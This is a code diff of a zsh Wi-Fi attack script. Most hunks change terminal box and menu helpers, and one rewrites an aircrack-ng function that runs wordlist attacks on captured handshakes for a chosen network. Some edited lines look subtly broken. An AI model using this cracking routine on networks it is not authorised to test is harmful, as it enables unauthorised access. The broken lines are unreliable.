@@ -1,15 +1,13 @@
 #!/bin/zsh
 # set -x
 # setopt nonomatch;
-setopt no_case_match;
+setopt no_case_match setopt extended_glob;
+
 function box () {
 (($# == 0)) && return 0;
-local a h B T H ul ur dl dr uh dh lv rv z r; local s=1;
-while getopts 'tsdbh:B:T:H:' a; do case $a in
-  (t) s=1; ((z+=1));; # thicc
-  (s) s=2; ((z+=1));; # sticc
-  (d) s=3; ((z+=1));; # double
-  (b) s=4; ((z+=1));; # braile
+local a h B T H ul ur dl dr uh dh lv rv z; integer s;
+while getopts 'l:h:B:T:H:' a; do case $a in
+  (l) ((5 > OPTARG > 0)) && s=${OPTARG} && ((z+=2));; # line style
   (h) h=${OPTARG}; ((z+=2));; # header
   (B) B=${OPTARG}; ((z+=2));; # box color
   (T) T=${OPTARG}; ((z+=2));; # text color
@@ -19,25 +17,16 @@ esac; done; unset a; ((z+=1));
 B='\033[3'"$(pcre2grep -o1 '([0-7])' <<< $B || <<< 7)$(pcre2grep -qio1 'b' <<< $B && <<< ';1')m";
 T='\033[3'"$(pcre2grep -o1 '([0-7])' <<< $T || <<< 7)$(pcre2grep -qio1 'b' <<< $T && <<< ';1')m";
 H='\033[3'"$(pcre2grep -o1 '([0-7])' <<< $H || <<< 7)$(pcre2grep -qio1 'b' <<< $H && <<< ';1')m";
-r='\033[0m';
+# r='\033[0m';
 
-ul=(┏ ┌ ╔ ⡏);
-dl=(┗ └ ╚ ⣇);
-ur=(┓ ┐ ╗ ⢹);
-dr=(┛ ┘ ╝ ⣸);
-uh=(━ ─ ═ ⠉);
-dh=(━ ─ ═ ⣀);
-lv=(┃ │ ║ ⡇);
-rv=(┃ │ ║ ⢸);
-
-ul=${ul[$s]};
-ur=${ur[$s]};
-dl=${dl[$s]};
-dr=${dr[$s]};
-uh=${uh[$s]};
-dh=${dh[$s]};
-lv=${lv[$s]};
-rv=${rv[$s]};
+ul=(┏ ┌ ╔ ⡏); ul=${ul[$s]};
+dl=(┗ └ ╚ ⣇); ur=${ur[$s]};
+ur=(┓ ┐ ╗ ⢹); dl=${dl[$s]};
+dr=(┛ ┘ ╝ ⣸); dr=${dr[$s]};
+uh=(━ ─ ═ ⠉); uh=${uh[$s]};
+dh=(━ ─ ═ ⣀); dh=${dh[$s]};
+lv=(┃ │ ║ ⡇); lv=${lv[$s]};
+rv=(┃ │ ║ ⢸); rv=${rv[$s]};
 
 s=0; for a in $@[$z,-1]; do ((${(c)#a} > s)) && s=${(c)#a}; done; 
 if ((${+h})) && ((${#h} > s)); then s=${#h}; ((s+=2)); fi; ((s+=2)); 
@@ -46,7 +35,8 @@ if ((${+h})) && ((${#h} > s)); then s=${#h}; ((s+=2)); fi; ((s+=2));
 
 for a in $@[$z,-1]; do printf "$lv $r$T${(r.((s-2)).. .)a} $r$B$rv\n"; done;
 
-printf "$dl${(pr.$s..$dh.)dh}$dr$r\n";
+# printf "$dl${(pr.$s..$dh.)dh}$dr$r\n";
+printf "$dl${(pr.$s..$dh.)dh}$dr\033[0m\n";
 }
 
 function menu () {
@@ -55,6 +45,8 @@ function menu () {
   (m) m=$(printf "\033[3$(pcre2grep -o1 '([0-7])' <<< ${OPTARG} || <<< 7)$(pcre2grep -qio1 'b' <<< ${OPTARG} && <<< ';1')m"); ((z+=2));;
   (t) t=$(printf "\033[3$(pcre2grep -o1 '([0-7])' <<< ${OPTARG} || <<< 7)$(pcre2grep -qio1 'b' <<< ${OPTARG} && <<< ';1')m"); ((z+=2));;
   esac; done; ((z+=1));
+  (($+m)) || m=$(printf '\033[0m');
+  (($+t)) || t=$(printf '\033[0m');
   for a in $@[$z,-1]; do printf '%s%4s    %s%s\n' $m ${a%% *} $t ${a#* }; done; printf '\033[0m';
 }
 
@@ -193,13 +185,15 @@ function aircrack-dict-attack () {
   local wl s;
 
   if [[ $(read -seq '?resume dictionary attack? ') = y ]]; then
-    s="$(printf '%s\n' "$(pwd)"/*.sesh(.bak)#(.) | fzy -p 'select sesh: ')";
-    [[ -f ${s} ]] && aircrack-ng -R ${s};
+    s+=(${(@f)"$(printf '%s\n' {t}/*/*.sesh(.bak)#(.))"}) &>/dev/null;
+    s+=(${(@f)"$(printf '%s\n' /root/dcs/wifi/*.sesh(.bak)#(.))"}) &>/dev/null;
+    ((${#s}!=0)) && [[ -f "$(fzy <<< ${s})" ]] && aircrack-ng -R ${s};
     return;
   fi;
 
   select-network; select-cap;
-  wl=(${(@f)"$(printf '%s\n' /root/dcs/wordlists/(*/)#*(.)) | fzf -i -m --reverse --prompt 'select wordlists: ')"}) &>/dev/null || read -k1 '?No wordlists found.' && return 1;
+  wl=(${(@f)"$(printf '%s\n' /root/dcs/wordlists/(*/)#*(.))"}); ((${#wl} == 0)) && read -k1 '?Nothing found. ' && return 1;
+  wl="$(fzf -i -m --reverse --prompt 'select wordlists: ' <<< ${wl})"; [[ ! -f ${wl} ]] && read -k1 "${wl}: File does not exist." && return 1;
 
   { sleep 30; while ps -C aircrack-ng &>/dev/null; do sleep $((60 * 10)); cp ${essid}.sesh ${essid}.sesh.bak; done; exit; } &;
   aircrack-ng -N ${essid}.sesh -l ${essid}.key -w "$(printf '%s,' $wl)" -b ${bssid} ${cap};
@@ -403,7 +397,7 @@ function quit () {
 }
 
 function () {
-  clear; printf '%s\n' 'Mind that you have the dependencies:'; printf '\t%s\n' 'airmon-ng' 'aircrack-ng' 'airodump-ng' 'airolib-ng' 'aireplay-ng' 'mdk4' 'crunch' 'pcre2grep' 'ps / procps' 'wash' ''; [[ $(read -seq '?Press y to continue: ') != y ]] && return 0;
+  # clear; printf '%s\n' 'Mind that you have the dependencies:'; printf '\t%s\n' 'airmon-ng' 'aircrack-ng' 'airodump-ng' 'airolib-ng' 'aireplay-ng' 'mdk4' 'crunch' 'pcre2grep' 'ps / procps' 'wash' ''; [[ $(read -seq '?Press y to continue: ') != y ]] && return 0;
   t=$(mktemp -d /mnt/tryhard.XXXXXXXX);
   cd $t;
   airmon-ng check kill;
